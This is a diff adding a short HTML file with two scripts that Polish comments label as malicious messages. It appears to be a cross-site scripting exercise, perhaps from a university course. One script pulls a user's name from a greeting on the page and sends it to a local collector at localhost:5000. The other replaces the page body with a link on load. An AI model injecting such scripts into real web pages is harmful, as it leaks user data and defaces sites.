@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <!--złośliwa widomość 1-->
+    <script>fetch(`http://localhost:5000/${/(?:.*)Witaj (.+)!(?:.*)/g.exec(document.body.textContent)[1]}`)</script>
+    <!--złośliwa widomość 2-->
+    <script>window.addEventListener("load", (e) => document.body.innerHTML = `<a href="https://www.pw.edu.pl">PW</a>`)</script>
+
+</html>
